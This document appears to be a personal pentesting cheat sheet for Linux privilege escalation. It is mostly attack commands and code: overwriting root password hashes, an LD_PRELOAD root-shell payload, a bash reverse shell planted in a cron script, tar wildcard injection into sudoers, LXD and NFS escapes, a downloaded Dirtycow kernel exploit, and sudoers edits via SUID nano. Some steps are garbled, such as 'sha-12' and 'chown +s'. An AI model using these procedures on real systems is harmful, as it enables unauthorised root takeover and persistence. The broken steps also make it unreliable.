### Userful tools
```bash
## Linpeas
./linpeas.sh
## GTFOBins
## Theres also a python version of GTFOBins
```

## File Permissions
```bash
## r=Readable w=Writable x=Executable -=Denied
## Example:
$ ls -l file
   -rw-r--r-- 1 root root 
## Owner of file (rw-), Group (r--) Other(r--)
## Owner = read/write denied, group = read denied denied, other = read denied denied
```

#### /etc/passwd/
```bash
ls -la /etc/passwd
    -rw-r--rw- 1 root root 1561 Sep 26 05:39 /etc/passwd
## above shows owner has rw, group has read and other has rw. Only root should be able to rw. We can use openssl to add a new user.

openssl passwd P@55word
## the characters that generated from above cmd should be add to the /etc/passwd file. replace the 'x' on the root user to try log in as root.
su root
```

### /etc/shadow
```bash
## Same deal as the /etc/passwd file. Not good security if we have rw to this file. Example:
ls -la /etc/shadow
	    -rw-r--rw- 1 root root 1034 Sep 26 05:39 /etc/shaodw
## Cat the file and use hash identifier to see what encryption method is used for the root passwd. if hash starts with $6$ encryption = sha-12

mkpasswd -m sha-12 p@S5w0rd
## copy output and replace the root encryption found in /etc/shadow
sudo su
```

### sudo -l
```bash
## run sudo -l to see if you have access to run any binaires as sudo.
sudo -l 
## if anything returns in the output, go to GTFObin to find a way to exploit.
```

### env_keep+=LD_PRELOAD
```bash
## If you see env_keep+=LD_PRELOAD when you execite sudo -l you could priv esc to root this way. create a the following C file:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}

## save to shell.c
## Compile and run the file
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
## once compiled, run it.
sudo LD_PRELOAD=/tmp/shell.so vim
## notice the last part of the cmd says vim. You must include a binary that you have sudo access to (sudo -l)
```

## Cronjobs
#### Misconfigured cronjobs
```bash
## View all cronjobs
cat /etc/crontab
## go to https://crontab.guru/ to find out time itervals example: * * * * *  = task runs every minute.
## use find command to search for the file with the cronjob assigned to it. CD to file and check permissions.
ls -la 
## add a bash rev shell to the file (pentestmonkey). If its a .sh file executing you have to change the start of the file from #! /bin/sh to #! /bin/bash. 

#! /bin/bash

bash -i >& /dev/tcp/0.0.0.0/4444 0>&1

## Save the file and start nc listener on port 4444 on local host
## wait for crobjob to run to connect back to your local host
```

#### PATH Environment Variables
```bash
## run cat /etc/crontab to see what PATH is available.
## There can be multiple PATHS.
## When a cronjob does not have an absolute PATH assigned to it, it will ## look for the file in all available PATHS specfied (if not found in first, move on to next PATH and so).
## Example: PATH=/home/50cent:/usr/local/sbin:/usr/local/bin
## First PATH is our home directory.

cd /home/50cent
nano same-file-name-as-cronjob.sh

#!/bin/bash

cp /bin/bash /tmp/dirtyroot
chmod +xs /tmp/dirtyroot

## Save file. +xs =  the owner of file will run.
chmod +x same-file-name-as-cronjob.sh

## Once cronjob runs, check to see in /tmp if a file called dirtyroot was created

/tmp/dirtyroot -p
## -p = execute this binary as owner of the file (root)
id
```

### Wildcard Injection
```bash
## You find a cronjob executing the following:

#!/bin/sh

cd /home/<USERNAME>
tar czf /tmp/backup-new.tar.gz *

## A wildcard (*) is at the end of the cronjob. Nioce
## cd into your /home directory as this is where the cronjob goes when executed
cd
## Paste the following
echo 'echo "<USERNAME> ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > priv.sh
## Then this
echo "" > "--checkpoint-action=exec=sh priv.sh"
## Followed with this
echo "" > --checkpoint=1
## Change permissions to anyone can execute (+x)
chmod +x priv.sh
## Wait for the cronjob to run and check permissions
sudo -l
## you should see:
(root) NOPASSWD: ALL
## Escalate to root priv
sudo su
id
```

### Bash History File
```bash
## Check the users bash history file for passwords
cat ~/.history
cat ~/.bash_history
```

### Configuration Files
```bash
## Check for files in user home directories that aren't default files in Linux systems.
## Example: cd to users home directory that you got access as, if theres a folder called vpn_files in the home directory, investigate the files in the folder as it may contain credentials. A quote from a peer of mine in my pentesting days: "50% of pentesting is looking through smb shares for credentials." 
```

### LXD Linux Containers
```bash
## Wtf is LXD: It's a container manager for Linux systems. Think of it like Docker

## Check if user is part of lxd group:
groups
<USERNAME> adm cdrom dip plugdev lxd

## Download this to local host
sudo git clone https://github.com/saghul/lxd-alpine-builder

cd lxd-alpine-builder
sudo ./build-alpine

## Transfer to victim host. start web server on local:
python3 -m http.server 
## victim host
wget http://0.0.0.0:8000/alpine-v3.15-x86_64-20211219_1210.tar.gz

lxd init 
## answer all Q's with yes
lxc image import alpine-v3.15-x86_64-20211219_1210.tar.gz --alias root

## Check if image was imported
lxc image list

## Now create a container using the imported alpine image. -c = give user access to root
lxc init root root-container -c security.privileged=true

## Check container was created, should be offline
lxc list

##
lxc config device add root-container mydevice disk source=/root path=/mnt/root recursive=true

#start contrainer
lxc start root-container
lxc exec root-container /bin/sh
id
cd /mnt/root
try create a user now with root priv to get persistence. Theres many things you can do to try to get persistence. 
```

### NFS
```bash
## Network File System
## Confirm nfs ports are open on server
## find nfs port open
nmap -sV -A 0.0.0.0
## show nfs export list
showmount -e 0.0.0.0
## On victim machine, check nfs config
cat /etc/exports
## no_root_squash specified on the nfs share? sweet.
cd <DIR-OF-NFS-SHARED-FOLDER>
## Copy the /bin/bash binary into your curret directory
cp /bin/bash ./
## Create a ahared directory on your attacker host
mkdir /tmp/evilshare
## Mount the nfs share onto your new evilshare
sudo mount -o rw -t nfs <victim-ip-address:<DIR-OF-NFS-SHARED-FOLDER>> /tmp/evilshare
cd /tmp/evilshare
ls
## bash binary should be inside folder
sudo chown root.root bash
sudo chown +s bash
## Go back to victim host share
ls -la bash
## bash binary should be owned by root ands have suid permissions.
./bash -p
id
cd /root
```

### Kernal Exploits
```bash
## Quick way to determine what kernal version you're on to google for exploit
uname -a
 ## Example of output:
 3.13.0-24-generic 46-Ubuntu SMP Thu Apr 10 19:11:08...
 ## 3.13.0-24-generic is more than enough info to google

## You can also use the tool linux-exploit-suggestor to find exploits
## https://github.com/The-Z-Labs/linux-exploit-suggester

## Transfer lin-exploit-sugg over to victim machine, host:
sudo python3 -m http.server

## On victims machine
wget http://0.0.0.0:8000/linux-exploit-suggestor.sh
chmod +x linux-exploit-suggestor.sh
./linux-exploit-suggestor
## Check results. Exmaple, you find Dirtycow. cowroot.c
## Download and compile exploit on attacker host
wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c

sudo gcc cowroot.c -o cowroot -pthread
## Ignore warnings, start python server again and transfer cowroot exploit to victim host:
chmod +x cowroot
./cowroot
id
cd /root
```

### SUID/SGID
```bash
## Set User ID is a type of permission
## Allow users to execute a file with permissions of a specified user.

## This cmd can search for SUID files:
find / -perm -u=s -type f 2>/dev/null

## You can use GTFObins to exploit SUID permissions.
## Now you need to check the permissions on the binaries returned. Example, /bin/nano returns in output.
ls -la /bin/nano 
## Output:
-rwsr-sr-x 1 root root 245872 Mar 6 2018 /bin/nano

## Cool. We have access to file and Root owns. Lets get access to /etc/sudoers
ls -la /etc/sudoers
-r--r----- 1 root root 754 Oct 6 07:57 /etc/sudoers
## We do not have write access to sudoers file. Lets try access sudoers using root permissions in nano.
/bin/nano /etc/sudoers

## We can now view/edit the file.
Under the root entry add your account.

# User privilege specification
root ALL=(ALL:ALL) ALL
<YOUR-USERNAME> ALL=(ALL:ALL) ALL

## Save the file and check your permissions
sudo -l
## enter pw

sudo su
id
cd /root
```